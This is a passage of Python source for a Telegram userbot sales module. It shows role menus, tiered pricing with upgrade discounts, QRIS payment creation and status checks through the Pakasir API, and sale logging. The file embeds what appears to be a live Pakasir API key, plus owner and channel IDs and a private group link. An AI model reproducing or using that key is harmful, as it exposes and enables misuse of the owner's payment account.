import asyncio
import importlib
import aiohttp
from io import BytesIO
from time import time as WaktuSekarang 
from datetime import datetime
from dateutil.relativedelta import relativedelta
from pytz import timezone

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from PyroUbot import *

# IMPORT DATABASE LU YANG SEBENARNYA
from PyroUbot.core.database.variabel import *
from PyroUbot.core.database.expired import *
from PyroUbot.core.database.pref import *
from PyroUbot.core.database.two_factor import *



# ============================================================
# 📋 ᴋᴏɴғɪɢᴜʀᴀꜱɪ ᴅᴀᴛᴀ ᴀᴘɪ ᴘᴀᴋᴀꜱɪʀ
# ============================================================

PakasirApiData = {
    "ApiKey": "8h9bv3Bw0VgdeIZkdiurNnaCYTIJQ663",
    "ProjectSlug": "safarudin"
}

IdChannelLogTransaksi = -1003937308381 

# ============================================================
# 🛠️ ғᴜɴɢꜱɪ ʜᴇʟᴘᴇʀ ɢᴇɴᴇʀᴀᴛᴇ ǫʀɪꜱ ᴘᴀᴋᴀꜱɪʀ
# ============================================================

async def BuatQrisPakasir(JumlahBayar, IdPesanan):
    """
    ғᴜɴɢꜱɪ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ʟɪɴᴋ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ǫʀɪꜱ ᴍᴇʟᴀʟᴜɪ ᴀᴘɪ ᴘᴀᴋᴀꜱɪʀ.
    """
    UrlPakasir = "https://app.pakasir.com/api/transactioncreate/qris"
    
    PayloadData = {
        "project": PakasirApiData["ProjectSlug"],
        "api_key": PakasirApiData["ApiKey"],
        "order_id": str(IdPesanan),
        "amount": JumlahBayar
    }
    
    async with aiohttp.ClientSession() as SesiBot:
        
        try:
            
            async with SesiBot.post(UrlPakasir, json=PayloadData) as ResponApi:
                
                DataJson = await ResponApi.json()
                
                DetailBayar = DataJson.get("payment") or DataJson
                
                KodeBayar = DataJson.get("code") or DetailBayar.get("code")
                
                StringQris = DetailBayar.get("payment_number") or \
                             DataJson.get("qris_string") or \
                             DetailBayar.get("qris_string")
                
                LinkGambarQr = None
                
                if KodeBayar:
                    
                    LinkGambarQr = f"https://app.pakasir.com/qris/{KodeBayar}.png"
                    
                elif StringQris:
                    
                    LinkGambarQr = f"https://quickchart.io/qr?text={StringQris}&size=500&format=png"
                
                if not LinkGambarQr:
                    
                    return None, None

                async with SesiBot.get(LinkGambarQr) as ResponGambar:
                    
                    if ResponGambar.status == 200:
                        
                        KontenGambar = await ResponGambar.read()
                        
                        FotoQris = BytesIO(KontenGambar)
                        
                        FotoQris.name = "qris_pembayaran.png"
                        
                        return FotoQris, IdPesanan
                        
        except Exception:
            
            return None, None
            
    return None, None

# ============================================================
# 🔍 ғᴜɴɢꜱɪ ʜᴇʟᴘᴇʀ ᴄᴇᴋ ꜱᴛᴀᴛᴜꜱ ᴘᴀᴋᴀꜱɪʀ
# ============================================================

async def CekStatusBayarPakasir(IdPesanan, JumlahBayar=None):
    """
    ғᴜɴɢꜱɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴄᴇᴋ ᴀᴘᴀᴋᴀʜ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ꜱᴜᴅᴀʜ ᴍᴀꜱᴜᴋ ᴀᴛᴀᴜ ʙᴇʟᴜᴍ.
    """
    UrlCek = "https://app.pakasir.com/api/transactiondetail"
    
    ParameterCek = {
        "project": PakasirApiData["ProjectSlug"], 
        "api_key": PakasirApiData["ApiKey"], 
        "order_id": IdPesanan
    }
    
    if JumlahBayar:
        
        ParameterCek["amount"] = JumlahBayar
        
    async with aiohttp.ClientSession() as SesiCek:
        
        try:
            
            async with SesiCek.get(UrlCek, params=ParameterCek) as ResponCek:
                
                DataStatus = await ResponCek.json()
                
                TransaksiData = DataStatus.get("transaction") or DataStatus or {}
                
                StatusTeks = str(TransaksiData.get("status", "")).upper()
                
                ListStatusSukses = ["PAID", "SUCCESS", "BERHASIL", "COMPLETED"]
                
                if any(X in StatusTeks for X in ListStatusSukses):
                    
                    return True
                    
                else:
                    
                    return False
                    
        except Exception:
            
            return False
            
    return False

# ============================================================
# 🚀 ᴘᴇʀɪɴᴛᴀʜ ꜱᴛᴀʀᴛ ᴜᴛᴀᴍᴀ
# ============================================================

@PY.BOT("start")
@PY.START
@PY.PRIVATE
async def StartUtama(client, message):
    """
    ʜᴀɴᴅʟᴇʀ ᴜɴᴛᴜᴋ ᴘᴇʀɪɴᴛᴀʜ /ꜱᴛᴀʀᴛ.
    """
    UserId = message.from_user.id
    
    TombolStart = BTN.START(message)
    
    PesanStart = MSG.START(message)
    
    FotoPanel = "https://files.catbox.moe/ge1y1k.jpg"
    
    MarkupStart = InlineKeyboardMarkup(TombolStart) if TombolStart else None
    
    await bot.send_photo(
        UserId, 
        FotoPanel, 
        caption=PesanStart, 
        reply_markup=MarkupStart
    )

# ============================================================
# 📦 ᴍᴇɴᴜ ʙᴀʜᴀɴ ᴅᴀɴ ᴘᴇɴɢᴇᴄᴇᴋᴀɴ ʀᴏʟᴇ
# ============================================================

@PY.CALLBACK("bahan")
async def MenuBahanUbot(client, callback_query):
    """
    ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ʙᴀʜᴀɴ ᴀᴛᴀᴜ ʀᴇꜱᴛᴀʀᴛ ᴜʙᴏᴛ.
    """
    UserId = callback_query.from_user.id
    
    if UserId in ubot._get_my_id:
        
        TombolKembali = [
            [
                InlineKeyboardButton("🔃 ʀᴇꜱᴛᴀʀᴛ ᴜꜱᴇʀʙᴏᴛ", callback_data="ress_ubot")
            ],
            [
                InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {UserId}")
            ],
        ]
        
        PesanSudahAda = (
            "<blockquote><b>ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\n"
            "ᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>"
        )
        
        return await callback_query.edit_message_text(
            PesanSudahAda,
            reply_markup=InlineKeyboardMarkup(TombolKembali)
        )

    DaftarRoleCek = [
        "PREM_USERS", 
        "SELER_USERS", 
        "ADMIN_USERS", 
        "OWNER_USERS", 
        "KHASJIR_USERS", 
        "CIOGWMAH_USERS", 
        "ALLROLE_USERS"
    ]
    
    StatusAkses = False
    
    for RoleNama in DaftarRoleCek:
        
        ListUserAkses = await get_list_from_vars(client.me.id, RoleNama)
        
        if UserId in ListUserAkses:
            
            StatusAkses = True
            
            break

    if not StatusAkses:
        
        TombolBeli = [
            [
                InlineKeyboardButton("ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴇ ᴍᴇɴᴜ ʀᴏʟᴇ", callback_data="role_menu")
            ],
            [
                InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ ᴋᴇ ʜᴏᴍᴇ", callback_data=f"home {UserId}")
            ],
        ]
        
        return await callback_query.edit_message_text(
            MSG.POLICY(), 
            reply_markup=InlineKeyboardMarkup(TombolBeli)
        )
        
    else:
        
        TombolLanjutBuat = [
            [
                InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ ʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ", callback_data="buat_ubot")
            ]
        ]
        
        PesanSudahBeli = (
            "<blockquote><b>ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ꜱɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ "
            "ᴛᴏᴍʙᴏʟ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>"
        )
        
        return await callback_query.edit_message_text(
            PesanSudahBeli,
            reply_markup=InlineKeyboardMarkup(TombolLanjutBuat)
        )

# ============================================================
# 🛒 ᴍᴇɴᴜ ᴘɪʟɪʜ ʀᴏʟᴇ ᴀᴋꜱᴇꜱ
# ============================================================

@PY.CALLBACK("role_menu")
async def MenuPilihRole(client, cq):
    """
    ᴍᴇɴᴜ ᴘᴇᴍɪʟɪʜᴀɴ ʀᴏʟᴇ ᴀᴋꜱᴇꜱ.
    """
    TombolDaftarRole = [
        [
            InlineKeyboardButton("👤 ᴍᴇᴍʙᴇʀ", callback_data="pilih_durasi member"), 
            InlineKeyboardButton("💼 ꜱᴇʟᴇꜱ", callback_data="pilih_durasi seles")
        ],
        [
            InlineKeyboardButton("🛡 ᴀᴅᴍɪɴ", callback_data="pilih_durasi admin"), 
            InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", callback_data="pilih_durasi owner")
        ],
        [
            InlineKeyboardButton("⚔ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ", callback_data="pilih_durasi tk")
        ],
        [
            InlineKeyboardButton("🏆 ᴄᴇᴏ", callback_data="pilih_durasi ceo")
        ],
        [
            InlineKeyboardButton("🔥 ғᴏᴜɴᴅᴇʀ", callback_data="pilih_durasi founder")
        ],
        [
            InlineKeyboardButton("⬅️ ᴋᴇᴍʙᴀʟɪ", callback_data="bahan")
        ]
    ]
    
    TeksPilihRole = "<blockquote><b>🛒 ᴘɪʟɪʜ ʀᴏʟᴇ ᴀᴋꜱᴇꜱ ʏᴀɴɢ ɪɴɢɪɴ ᴀɴᴅᴀ ʙᴇʟɪ:</b></blockquote>"
    
    await cq.edit_message_text(
        TeksPilihRole, 
        reply_markup=InlineKeyboardMarkup(TombolDaftarRole)
    )

@PY.CALLBACK("pilih_durasi")
async def MenuPilihDurasi(client, cq):
    """
    ᴍᴇɴᴜ ᴘᴇᴍɪʟɪʜᴀɴ ᴅᴜʀᴀꜱɪ ᴀᴋꜱᴇꜱ.
    """
    NamaRole = cq.data.split()[1]
    
    TombolDurasi = [
        [
            InlineKeyboardButton("🗓️ 1 ʙᴜʟᴀɴ", callback_data=f"confirm {NamaRole} 1")
        ],
        [
            InlineKeyboardButton("♾️ ᴘᴇʀᴍᴀɴᴇɴ", callback_data=f"confirm {NamaRole} 0")
        ],
        [
            InlineKeyboardButton("⬅️ ᴋᴇᴍʙᴀʟɪ", callback_data="role_menu")
        ]
    ]
    
    TeksPilihDurasi = f"<blockquote><b>⏳ ᴘɪʟɪʜ ᴅᴜʀᴀꜱɪ ᴜɴᴛᴜᴋ ᴀᴋꜱᴇꜱ {NamaRole}:</b></blockquote>"
    
    await cq.edit_message_text(
        TeksPilihDurasi, 
        reply_markup=InlineKeyboardMarkup(TombolDurasi)
    )

# ============================================================
# 💳 ᴋᴏɴғɪʀᴍᴀꜱɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴅᴀɴ ɪɴᴠᴏɪᴄᴇ
# ============================================================

@PY.CALLBACK("confirm")
async def ProsesKonfirmasiBayar(client, cq):
    """
    ɢᴇɴᴇʀᴀᴛᴇ ǫʀɪs ᴅᴀɴ ɪɴᴠᴏɪᴄᴇ ᴅᴇɴɢᴀɴ sɪsᴛᴇᴍ sᴇʟɪsɪʜ ʜᴀʀɢᴀ.
    ꜰᴏɴᴛ: ꜰᴜʟʟ sᴍᴀʟʟᴄᴀᴘs | ɴᴏ ᴅɪᴀᴍᴏɴᴅ | ꜰɪx ɢᴇᴛ_ᴠᴀʀs.
    """
    try:
        QueryData = cq.data.split()
        RoleDipilih = QueryData[1]
        DurasiDipilih = QueryData[2]
        UserId = cq.from_user.id
        BotID = client.me.id
        
        # 1. ᴅᴀᴛᴀʙᴀsᴇ ʜᴀʀɢᴀ ᴅᴀsᴀʀ
        DaftarHargaRole = {
            "member": {"1": 1000, "0": 2000}, 
            "seles": {"1": 3000, "0": 5000}, 
            "admin": {"1": 7000, "0": 10000}, 
            "owner": {"1": 13000, "0": 15000}, 
            "tk": {"1": 17000, "0": 20000}, 
            "ceo": {"1": 22000, "0": 25000}, 
            "founder": {"1": 32000, "0": 35000}
        }
        
        HargaTarget = DaftarHargaRole.get(RoleDipilih, {}).get(DurasiDipilih, 5000)
        Potongan = 0

        # 2. ʟᴏɢɪᴋᴀ sᴍᴀʀᴛ ᴍᴀᴛʜ (ꜰɪx: ɢᴇᴛ_ᴠᴀʀs & ᴀʟʟʀᴏʟᴇ ꜰᴏᴜɴᴅᴇʀ)
        if await get_vars(BotID, "ALLROLE_USERS", UserId): 
            Potongan = DaftarHargaRole["founder"][DurasiDipilih]
        elif await get_vars(BotID, "CIOGWMAH_USERS", UserId): 
            Potongan = DaftarHargaRole["ceo"][DurasiDipilih]
        elif await get_vars(BotID, "KHASJIR_USERS", UserId): 
            Potongan = DaftarHargaRole["tk"][DurasiDipilih]
        elif await get_vars(BotID, "OWNER_USERS", UserId): 
            Potongan = DaftarHargaRole["owner"][DurasiDipilih]
        elif await get_vars(BotID, "ADMIN_USERS", UserId): 
            Potongan = DaftarHargaRole["admin"][DurasiDipilih]
        elif await get_vars(BotID, "SELER_USERS", UserId): 
            Potongan = DaftarHargaRole["seles"][DurasiDipilih]
        elif await get_vars(BotID, "PREM_USERS", UserId): 
            Potongan = DaftarHargaRole["member"][DurasiDipilih]

        NominalBayar = max(0, HargaTarget - Potongan)

        if NominalBayar == 0:
            return await cq.answer("⚠️ ᴀɴᴅᴀ sᴜᴅᴀʜ ᴍᴇᴍɪʟɪᴋɪ ᴀᴋsᴇs ɪɴɪ ᴀᴛᴀᴜ ʏᴀɴɢ ʟᴇʙɪʜ ᴛɪɴɢɢɪ!", show_alert=True)
        
        await cq.edit_message_text(
            "<blockquote><b>🔄 sᴇᴅᴀɴɢ ᴍᴇɴɢɢᴇɴᴇʀᴀᴛᴇ ǫʀɪs ᴘᴇᴍʙᴀʏᴀʀᴀɴ...</b></blockquote>"
        )
        
        IdOrder = f"IQB-{UserId}-{int(WaktuSekarang())}"
        FileQris, RefId = await BuatQrisPakasir(NominalBayar, IdOrder)
        
        if not FileQris:
            return await cq.edit_message_text("<blockquote><b>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ ᴘᴇᴍʙᴀʏᴀʀᴀɴ!</b></blockquote>")
        
        # 3. ᴛᴇᴋs ɪɴᴠᴏɪᴄᴇ (ᴜᴅᴀʜ ꜰᴜʟʟ sᴍᴀʟʟᴄᴀᴘs ᴄᴏ!)
        TeksInvoice = (
            f"<blockquote><b>📜 ɪɴᴠᴏɪᴄᴇ ᴛʀᴀɴsᴀᴋsɪ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⿻ <b>ᴏʀᴅᴇʀ ɪᴅ :</b> <code>{IdOrder}</code>\n"
            f"⿻ <b>ʀᴏʟᴇ ᴀᴋsᴇs :</b> {RoleDipilih.upper()}\n"
            f"⿻ <b>ᴅᴜʀᴀsɪ :</b> {'1 ʙᴜʟᴀɴ' if DurasiDipilih == '1' else 'ᴘᴇʀᴍᴀɴᴇɴ'}\n"
            f"⿻ <b>ɴᴏᴍɪɴᴀʟ :</b> <b>ʀᴘ {NominalBayar:,}</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>sɪʟᴀʜᴋᴀɴ sᴄᴀɴ ǫʀɪs ᴅɪ ᴀᴛᴀs,\n"
            f"ʟᴀʟᴜ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴄᴇᴋ sᴛᴀᴛᴜs!</b></blockquote>"
        )
        
        await cq.message.delete()
        
        # ᴛᴏᴍʙᴏʟ ᴄᴇᴋ sᴛᴀᴛᴜs (sᴍᴀʟʟᴄᴀᴘs & ɴᴏ ᴅɪᴀᴍᴏɴᴅ)
        TombolCekStatus = [
            [
                InlineKeyboardButton(
                    "✅ ᴄᴇᴋ sᴛᴀᴛᴜs ʙᴀʏᴀʀ", 
                    callback_data=f"cek_bayar {IdOrder} {RoleDipilih} {DurasiDipilih}"
                )
            ]
        ]
        
        await bot.send_photo(
            UserId, 
            photo=FileQris, 
            caption=TeksInvoice, 
            reply_markup=InlineKeyboardMarkup(TombolCekStatus)
        )
    except Exception as e:
        await cq.answer(f"❌ ᴇʀʀᴏʀ: {e}", show_alert=True)
        
    

# 🆙 ᴍᴇɴᴜ ᴜᴘɢʀᴀᴅᴇ ʀᴏʟᴇ (ꜱᴍᴀʀᴛ ᴍᴀᴛʜ - ꜱᴍᴀʟʟᴄᴀᴘs)
# ============================================================

@PY.CALLBACK("upgrade_menu")
async def MenuUpgradeSmartMath(client, cq):
    try:
        UserId = cq.from_user.id
        BotID = client.me.id
        
        # ᴄᴇᴋ ʀᴏʟᴇ ᴜsᴇʀ sᴀᴀᴛ ɪɴɪ (ғɪx ᴇʀʀᴏʀ ɪs_ᴠᴀʀs)
        RoleUser = "ɴᴏɴᴇ"
        if await get_vars(BotID, "ALLROLE_USERS", UserId): 
            return await cq.answer("👑 ʀᴏʟᴇ ᴀɴᴅᴀ sᴜᴅᴀʜ ғᴏᴜɴᴅᴇʀ (ᴛᴇʀᴛɪɴɢɢɪ)!", show_alert=True)
        elif await get_vars(BotID, "CIOGWMAH_USERS", UserId): RoleUser = "ᴄᴇᴏ"
        elif await get_vars(BotID, "KHASJIR_USERS", UserId): RoleUser = "ᴛᴋ"
        elif await get_vars(BotID, "OWNER_USERS", UserId): RoleUser = "ᴏᴡɴᴇʀ"
        elif await get_vars(BotID, "ADMIN_USERS", UserId): RoleUser = "ᴀᴅᴍɪɴ"
        elif await get_vars(BotID, "SELER_USERS", UserId): RoleUser = "sᴇʟᴇs"
        elif await get_vars(BotID, "PREM_USERS", UserId): RoleUser = "ᴍᴇᴍʙᴇʀ"

        # ᴛᴇᴋs ᴍᴇɴᴜ (ᴇᴍᴏᴊɪ ᴜᴘ ᴅɪʜᴀᴘᴜs + sᴍᴀʟʟ ᴄᴀᴘs + ɴᴏ sᴘᴀᴄᴇ ʀᴏʟᴇ/sɪsᴛᴇᴍ)
        Teks = (
            "<blockquote><b>ᴜᴘɢʀᴀᴅᴇ ʀᴏʟᴇ sʏsᴛᴇᴍ</b>\n"
            "━━━━━━━━━━━━━━━━\n\n"
            f"👤<b>ʀᴏʟᴇ ᴀɴᴅᴀ:</b> {RoleUser.upper()}\n"
            f"💰<b>sɪsᴛᴇᴍ:</b> ʙᴀʏᴀʀ sɪsᴀ sᴇʟɪsɪʜ ʜᴀʀɢᴀ\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʀᴏʟᴇ ᴛᴀʀɢᴇᴛ ᴜᴘɢʀᴀᴅᴇ :</blockquote>"
        )

        AllRoles = ["member", "seles", "admin", "owner", "tk", "ceo", "founder"]
        try: StartIdx = AllRoles.index(RoleUser.lower()) + 1
        except: StartIdx = 0
        
        TargetList = AllRoles[StartIdx:]
        Tombol = []
        for i in range(0, len(TargetList), 2):
            Row = [InlineKeyboardButton(f"💎 {TargetList[i].upper()}", callback_data=f"pilih_durasi {TargetList[i]}")]
            if i+1 < len(TargetList):
                Row.append(InlineKeyboardButton(f"💎 {TargetList[i+1].upper()}", callback_data=f"pilih_durasi {TargetList[i+1]}"))
            Tombol.append(Row)
        
        Tombol.append([InlineKeyboardButton("⬅️ ᴋᴇᴍʙᴀʟɪ", callback_data="role_menu")])
        await cq.edit_message_text(Teks, reply_markup=InlineKeyboardMarkup(Tombol))

    except Exception as e:
        await cq.answer(f"❌ ᴇʀʀᴏʀ: {e}", show_alert=True)
        
           
# ============================================================
# 📢 ᴄᴇᴋ sᴛᴀᴛᴜs ʙᴀʏᴀʀ (sᴍᴀʀᴛ ᴍᴀᴛʜ ʟᴏɢɪᴄ)
# ============================================================

@PY.CALLBACK("cek_bayar")
async def AksiCekPembayaran(client, cq):
    """
    ᴄᴇᴋ sᴛᴀᴛᴜs ᴘᴇᴍʙᴀʏᴀʀᴀɴ, ɪɴᴘᴜᴛ ᴅᴀᴛᴀʙᴀsᴇ, ᴅᴀɴ ᴋɪʀɪᴍ sᴛʀᴜᴋ + ʟᴏɢ ᴏᴡɴᴇʀ (ᴘᴍ).
    """
    try:
        DataPesan = cq.data.split()
        OrderId = DataPesan[1]
        RoleNama = DataPesan[2]
        DurasiTipe = DataPesan[3]
        UserId = cq.from_user.id
        NamaUser = cq.from_user.first_name
        BotID = client.me.id
        
        # 1. DATABASE HARGA (SMART MATH)
        HargaAsli = {
            "member": {"1": 1000, "0": 2000},
            "seles": {"1": 3000, "0": 5000},
            "admin": {"1": 7000, "0": 10000},
            "owner": {"1": 13000, "0": 15000},
            "tk": {"1": 17000, "0": 20000},
            "ceo": {"1": 22000, "0": 25000},
            "founder": {"1": 32000, "0": 35000}
        }
        
        HargaTarget = HargaAsli.get(RoleNama, {}).get(DurasiTipe, 0)
        Potongan = 0

        # LOGIKA POTONGAN (TERMASUK FOUNDER/ALLROLE)
        if await get_vars(BotID, "ALLROLE_USERS", UserId): Potongan = HargaAsli["founder"][DurasiTipe]
        elif await get_vars(BotID, "CIOGWMAH_USERS", UserId): Potongan = HargaAsli["ceo"][DurasiTipe]
        elif await get_vars(BotID, "KHASJIR_USERS", UserId): Potongan = HargaAsli["tk"][DurasiTipe]
        elif await get_vars(BotID, "OWNER_USERS", UserId): Potongan = HargaAsli["owner"][DurasiTipe]
        elif await get_vars(BotID, "ADMIN_USERS", UserId): Potongan = HargaAsli["admin"][DurasiTipe]
        elif await get_vars(BotID, "SELER_USERS", UserId): Potongan = HargaAsli["seles"][DurasiTipe]
        elif await get_vars(BotID, "PREM_USERS", UserId): Potongan = HargaAsli["member"][DurasiTipe]

        TotalHarusBayar = max(0, HargaTarget - Potongan)

        # 2. CEK STATUS VIA API
        ApakahSudahBayar = await CekStatusBayarPakasir(OrderId, TotalHarusBayar)
        if not ApakahSudahBayar:
            return await cq.answer("❌ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʙᴇʟᴜᴍ ᴅɪᴛᴇʀɪᴍᴀ!", show_alert=True)

        # 3. PROSES DATABASE ROLE & EXPIRED
        ListRoleDatabase = ["PREM_USERS", "SELER_USERS", "ADMIN_USERS", "OWNER_USERS", "KHASJIR_USERS", "CIOGWMAH_USERS", "ALLROLE_USERS"]
        IndeksRank = {"member": 1, "seles": 2, "admin": 3, "owner": 4, "tk": 5, "ceo": 6, "founder": 7}
        BatasRole = IndeksRank.get(RoleNama, 1)
        
        for I in range(BatasRole):
            try: await add_to_vars(BotID, ListRoleDatabase[I], UserId)
            except: continue
        
        ZonaWaktu = timezone("Asia/Jakarta")
        WaktuSekarangTz = datetime.now(ZonaWaktu)
        TeksMasaAktif = "1 ʙᴜʟᴀɴ" if DurasiTipe == "1" else "ᴘᴇʀᴍᴀɴᴇɴ"
        
        TanggalExpired = WaktuSekarangTz + (relativedelta(months=1) if DurasiTipe == "1" else relativedelta(years=100))
        await set_expired_date(UserId, TanggalExpired)

        # 4. FORMAT WAKTU (STRUK CHANNEL)
        WaktuFormatStruk = WaktuSekarangTz.strftime("%A, %d %B %Y %H:%M WIB")
        NamaHariIndo = {'Monday':'𝗦𝗲𝗻𝗶𝗻','Tuesday':'𝗦𝗲𝗹𝗮𝘀𝗮','Wednesday':'𝗥𝗮𝗯𝘂','Thursday':'𝗞𝗮𝗺𝗶𝘀','Friday':'𝗝𝘂𝗺𝗮𝘁','Saturday':'𝗦𝗮𝗯𝘁𝘂','Sunday':'𝗠𝗶𝗻𝗴𝗴𝘂'}
        for Eng, Indo in NamaHariIndo.items(): WaktuFormatStruk = WaktuFormatStruk.replace(Eng, Indo)

# 5. KIRIM LOG KE CHANNEL (STRUK GAMBAR)
        TeksCaptionLog = (
            "<blockquote>"
            "📜 <b>𝗦𝗧𝗥𝗨𝗞 𝗣𝗘𝗠𝗕𝗘𝗟𝗜𝗔𝗡 𝗣𝗥𝗢𝗗𝗨𝗞</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━❍\n\n"
            "🪪 <b>𝗜𝗗𝗘𝗡𝗧𝗜𝗧𝗔𝗦 𝗣𝗘𝗠𝗕𝗘𝗟𝗜</b>\n"
            f"├ 👤 <b>𝗡𝗮𝗺𝗮 :</b> {NamaUser}\n"
            f"╰ 🆔 <b>𝗜𝗗 :</b> <code>{UserId}</code>\n\n"
            "🎀 <b>𝗗𝗔𝗧𝗔 𝗣𝗥𝗢𝗗𝗨𝗞</b>\n"
            f"├ 🛒 <b>𝗣𝗿𝗼𝗱𝘂𝗸 :</b> {RoleNama.upper()} ({TeksMasaAktif.upper()})\n"
            f"├ 💰 <b>𝗛𝗮𝗿𝗴𝗮 :</b> 𝗥𝗽 {TotalHarusBayar:,}\n"
            f"╰ ⏰ <b>𝗪𝗮𝗸𝘁𝘂 :</b> {WaktuFormatStruk}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━❍\n"
            "📨 <b>𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗦𝘂𝗱𝗮𝗵 𝗕𝗲𝗹𝗮𝗻𝗷𝗮</b>"
            "</blockquote>"
        )
        try:
            await bot.send_photo(
                chat_id=IdChannelLogTransaksi, 
                photo="https://files.catbox.moe/ge1y1k.jpg", 
                caption=TeksCaptionLog, 
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤖 𝗞𝗲 𝗕𝗼𝘁 𝗨𝘁𝗮𝗺𝗮", url="https://t.me/liteubotpremditz_bot")]])
            )
        except: pass

        # --- LOG OWNER JAPRI (PM) ---
        TeksLogPm = (
            "<blockquote>"
            "🔔 <b>ʟᴀᴘᴏʀᴀɴ ᴘᴇɴᴊᴜᴀʟᴀɴ (ᴘᴍ)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>ᴘᴇᴍʙᴇʟɪ:</b> {NamaUser}\n"
            f"🆔 <b>ɪᴅ:</b> <code>{UserId}</code>\n"
            f"🛒 <b>ᴘʀᴏᴅᴜᴋ:</b> {RoleNama.capitalize()} - {TeksMasaAktif}\n"
            f"💰 <b>ɴᴏᴍɪɴᴀʟ:</b> ʀᴘ {TotalHarusBayar:,}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ ꜱᴜᴅᴀʜ ᴏᴛᴏᴍᴀᴛɪꜱ ᴛᴇʀ-ɪɴᴘᴜᴛ ᴋᴇ ᴅᴀᴛᴀʙᴀꜱᴇ.</blockquote>"
        )
        try:
            ID_OWNER = 1680896327  # ID Owner Lu
            await bot.send_message(ID_OWNER, TeksLogPm)
        except: pass

        # 6. PESAN SUKSES KE USER
        IsMemberMonth = (RoleNama.lower() == "member" and DurasiTipe == "1")
        TeksSuksesUser = (
            "<blockquote>"
            "<b>✅ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʙᴇʀʜᴀsɪʟ!</b>\n\n"
            f"💎 <b>ʀᴏʟᴇ :</b> {RoleNama.upper()}\n"
            f"🗓️ <b>ᴍᴀsᴀ ᴀᴋᴛɪғ :</b> {TeksMasaAktif.upper()}\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ\n"
            "ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ sᴇᴋᴀʀᴀɴɢ!"
        )
        if not IsMemberMonth:
            TeksSuksesUser += (
                "\n\n<b>🔗 ʟɪɴᴋ ɢʀᴜᴘ ᴋʜᴜsᴜs:</b>\n"
                "https://t.me/+C3819ttIPcRhZGNl\n\n"
                "<b>💬 sɪʟᴀʜᴋᴀɴ ᴊᴏɪɴ ᴅᴀɴ ᴛᴀɢ ᴀᴅᴍɪɴ\n"
                "ᴜɴᴛᴜᴋ ᴋʟᴀɪᴍ ʀᴏʟᴇ ᴅɪ ɢʀᴜᴘ!</b>"
            )
        TeksSuksesUser += "</blockquote>"

        await cq.message.delete()
        await bot.send_message(
            UserId, 
            TeksSuksesUser, 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤖 ʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ sᴇᴋᴀʀᴀɴɢ", callback_data="add_ubot")]])
        )

    except Exception as e:
        await cq.answer(f"❌ ERROR: {e}", show_alert=True)
        
    
# ============================================================
# 🆔 𝗖𝗲𝗸 𝗦𝘁𝗮𝘁𝘂𝘀 𝗨𝘀𝗲𝗿𝗯𝗼𝘁
# ============================================================

@PY.CALLBACK("status")
async def CekStatusUser(client, callback_query):
    """
    ғᴜɴɢꜱɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴄᴇᴋ ꜱᴛᴀᴛᴜꜱ ʟᴀɢɴɢᴀɴᴀɴ ᴅᴀɴ ᴘʀᴇғɪx ᴜꜱᴇʀ.
    """
    UserId = callback_query.from_user.id
    
    if UserId in ubot._get_my_id:
        
        DataExpired = await get_expired_date(UserId)
        
        DataPrefix = await get_pref(UserId)
        
        FormatWaktu = DataExpired.strftime("%d-%m-%Y") if DataExpired else "ɴᴏɴᴇ"
        
        TeksStatusAkses = (
            f"<blockquote><b>ᴜʙᴏᴛ ʟɪᴛᴇ ᴘʀᴇᴍɪᴜᴍ\n"
            f"  ꜱᴛᴀᴛᴜꜱ : ᴘʀᴇᴍɪᴜᴍ\n"
